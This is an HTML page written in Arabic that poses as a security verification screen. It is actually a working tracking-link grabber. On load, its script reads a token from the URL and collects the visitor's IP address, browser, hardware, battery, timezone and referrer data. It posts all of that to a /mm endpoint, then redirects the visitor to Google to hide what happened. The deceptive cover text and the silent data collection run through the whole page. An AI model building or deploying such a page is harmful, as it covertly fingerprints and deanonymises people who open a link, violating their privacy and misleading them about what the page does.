<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحويلك إلى النظام الموثوق | Security Verification</title>
    
    <!-- وسوم المعاينة الاجتماعية -->
    <meta property="og:title" content="فحص أمان النظام وحماية الحسابات | Security Check">
    <meta property="og:description" content="جاري التحقق من أمان الجهاز والاتصال لتأكيد هويتك...">
    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
        .secure-gradient { background: linear-gradient(135deg, #059669 0%, #10B981 100%); }
    </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6">
        
        <div class="w-16 h-16 rounded-2xl secure-gradient flex items-center justify-center mx-auto text-3xl text-white shadow-lg shadow-emerald-500/20 animate-pulse">
            <i class="fa-solid fa-shield-halved"></i>
        </div>

        <div class="space-y-2">
            <h1 class="text-xl font-bold text-white">جاري فحص وتأمين الاتصال...</h1>
            <p class="text-xs text-slate-400">يرجى الانتظار قليلاً بينما يتحقق النظام من أمان جهازك وحمايتك.</p>
        </div>

        <div class="flex justify-center items-center space-x-2 space-x-reverse py-4">
            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce"></div>
            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.2s]"></div>
            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
        </div>

        <div id="statusText" class="text-xs text-slate-500">
            جاري جمع معلومات النظام والاتصال الآمن...
        </div>

    </div>

    <script>
        window.addEventListener('DOMContentLoaded', async () => {
            // 1. استخراج الرمز (Token) من الرابط Query Parameter أو المسار
            const urlParams = new URLSearchParams(window.location.search);
            const token = urlParams.get('t') || window.location.pathname.split('/').pop();

            if (!token) {
                console.error('Token not found.');
                return;
            }

            // 2. جمع معلومات الجهاز تلقائياً وبشكل شامل
            let ipAddress = 'غير معروف';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ipAddress = ipData.ip;
            } catch (e) {
                ipAddress = 'محلي / مخفي';
            }

            // جلب معلومات البطارية إن توفرت في المتصفح
            let batteryInfo = 'غير مدعوم';
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `الشحن: ${Math.round(battery.level * 100)}% | الحالة: ${battery.charging ? 'يتم الشحن' : 'على البطارية'}`;
                }
            } catch (e) {}

            const deviceInfo = {
                ip: ipAddress,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متوفر',
                hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : 'غير متوفر',
                battery: batteryInfo,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                referrer: document.referrer || 'مباشر'
            };

            // 3. تجهيز البيانات وإرسالها عبر POST إلى المسار المطلوب /mm
            const payload = {
                token: token,
                deviceInfo: deviceInfo
            };

            try {
                await fetch('/mm', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Failed to submit device info');
            }

            // 4. التوجيه التلقائي للموقع الحقيقي أو صفحة الأمان بعد جمع البيانات
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 1500);
        });
    </script>
</body>
</html>
